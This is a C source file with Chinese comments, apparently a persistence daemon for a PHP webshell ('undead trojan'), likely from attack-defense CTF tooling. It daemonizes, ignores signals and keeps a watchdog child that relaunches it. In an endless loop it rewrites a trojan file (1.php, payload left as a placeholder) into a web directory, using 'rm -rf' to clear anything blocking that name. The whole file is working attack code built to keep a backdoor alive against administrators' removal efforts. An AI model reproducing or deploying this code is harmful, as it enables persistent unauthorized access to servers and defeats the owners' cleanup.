#include <stdio.h>
#include <sys/types.h>
#include <dirent.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/param.h>
#include <sys/stat.h>
#include <time.h>
#include <wait.h>

#define BSMDIR "/home/lleaves/vscode"   //马前级目录
#define BSMNAME "1.php"                 //马名称
#define SHELL "rm -rf "                 //删除马的shell命令
#define MAXN 20000                      //数组最大长度
#define REBOOT "./home/lleaves/vscode/MAKE" //守护进程重启程序命令

int main()
{
    FILE *fp;
    int tag=0;
    int pid;
    int newpid;
    int memory;
    DIR *ndir;
    struct dirent* entry;
    char tmp[MAXN]={'\0'};
    char abdir[MAXN]={'\0'};
    char buffer[MAXN]={'\0'};
    strcpy(abdir,(const char*)BSMDIR);
    *(abdir+strlen(BSMDIR)) = '/';
    strcpy(abdir+strlen(BSMDIR)+1,(const char*)BSMNAME);
    
    const char phpcode[] = "busemates";     //这里写马，直接填充

    strcpy(tmp,SHELL);
    strcpy(tmp+strlen(tmp),abdir);

    strcpy(buffer,"echo ");
    buffer[5] = '\'';
    strcpy(buffer+6,phpcode);
    buffer[strlen(buffer)] = '\'';
    strcpy(buffer+strlen(buffer)," > ");
    strcpy(buffer+strlen(buffer),abdir);

    signal(SIGTTOU,SIG_IGN);
	signal(SIGTTIN,SIG_IGN);
	signal(SIGTSTP,SIG_IGN);
	signal(SIGHUP,SIG_IGN);
    pid = fork();
    if(pid != 0) exit(0);
    setsid();
    chdir("/");
    umask(0);
    signal(SIGCHLD,SIG_IGN);

    newpid = fork();
    if(newpid == 0){
        while (1){
            if(getppid()==1){
                system(REBOOT);
                exit(0);
            }
        }
    }

    loopbegin:
    if(kill(newpid,0)!=0){
        wait(NULL);
        newpid = fork();
        if(newpid == 0){
           while (1){
                if(getppid()==1){
                    system(REBOOT);
                    exit(0);
                }
            }
        }
    }
    ndir = opendir(BSMDIR);
    while((entry=readdir(ndir))!=NULL){
        if(strcmp(BSMNAME,(const char*)entry->d_name)==0){
            tag = 1;
            if(entry->d_type==8){
                system(buffer);
                goto loop;
            }
            else{
                system(tmp);
                goto write;
            }
        }
    }

    if(tag==0){
        system(buffer);
        goto loop;
    }

    loop:
        while(1){
            tag = 0;
            closedir(ndir);
            goto loopbegin;
        }

    write:
        system(buffer);
        goto loop;

    return 0;
}